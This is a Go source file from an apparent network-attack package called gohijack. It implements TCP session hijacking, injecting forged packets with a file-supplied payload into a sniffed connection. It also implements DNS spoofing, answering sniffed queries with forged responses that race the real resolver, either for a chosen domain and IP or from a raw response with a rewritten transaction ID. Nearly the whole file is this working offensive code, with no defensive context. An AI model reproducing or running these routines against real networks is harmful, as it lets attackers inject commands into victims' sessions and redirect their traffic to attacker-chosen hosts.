package gohijack

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/ssst0n3/go-shijack/sniff"
	"net"
	"os"
)

func doHijack(packet gopacket.Packet, payload []byte) (err error) {
	connection, err := NewConnectionFromPacket(packet)
	if err != nil {
		return
	}
	tcpLayer, ipv4Layer, err := connection.GenerateLayers(payload)
	if err != nil {
		return
	}
	buf, err := connection.Serialize(tcpLayer, ipv4Layer, payload)
	if err != nil {
		return
	}
	err = connection.SendIP(buf)
	if err != nil {
		return
	}
	return
}

func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile string, once bool) (err error) {
	payload, err := os.ReadFile(payloadFile)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	sniffer := sniff.PureGo{}
	filter, err := GenerateFilter(srcIp, srcPort)
	if err != nil {
		return
	}
	packets, err := sniffer.Sniff(interfaceName, filter)
	if err != nil {
		return
	}
	for packet := range packets {
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		tcp, _ := tcpLayer.(*layers.TCP)
		if tcp.ACK {
			err = doHijack(packet, payload)
			if err != nil {
				continue
			}
			if once {
				return
			}
		}
	}
	return
}

// HijackDNS sniffs DNS queries addressed to (resolverIp:resolverPort) and
// races the real resolver with a forged UDP response. When domain and answerIp
// are both non-empty the response is built on the fly; otherwise rawResponseFile
// is loaded once and its transaction ID is rewritten per query. At least one of
// the two modes must be supplied.
func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, domain string, answerIp net.IP, rawResponseFile string, once bool) (err error) {
	var rawResponse []byte
	if rawResponseFile != "" {
		rawResponse, err = os.ReadFile(rawResponseFile)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
	}
	autoMode := domain != "" && answerIp != nil
	if !autoMode && rawResponse == nil {
		err = fmt.Errorf("dns hijack needs either --dns-domain/--dns-ip or a payload file")
		awesome_error.CheckErr(err)
		return
	}
	sniffer := sniff.PureGo{}
	filter, err := GenerateFilterUDP(resolverIp, resolverPort)
	if err != nil {
		return
	}
	packets, err := sniffer.Sniff(interfaceName, filter)
	if err != nil {
		return
	}
	for packet := range packets {
		udpLayer := packet.Layer(layers.LayerTypeUDP)
		if udpLayer == nil {
			continue
		}
		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer == nil {
			continue
		}
		queryDNS, _ := dnsLayer.(*layers.DNS)
		if queryDNS == nil {
			continue
		}
		if queryDNS.QR {
			continue
		}
		var payload []byte
		if autoMode {
			payload, err = BuildDNSResponse(queryDNS, domain, answerIp)
			if err != nil {
				continue
			}
		} else {
			payload = RewriteTXID(rawResponse, queryDNS.ID)
		}
		err = doHijackUDP(packet, payload)
		if err != nil {
			continue
		}
		if once {
			return
		}
	}
	return
}

func doHijackUDP(packet gopacket.Packet, payload []byte) (err error) {
	connection, err := NewUDPConnectionFromPacket(packet)
	if err != nil {
		return
	}
	udpLayer, ipv4Layer, err := connection.GenerateLayersUDP(payload)
	if err != nil {
		return
	}
	buf, err := connection.SerializeUDP(udpLayer, ipv4Layer, payload)
	if err != nil {
		return
	}
	err = connection.SendIP(buf)
	if err != nil {
		return
	}
	return
}
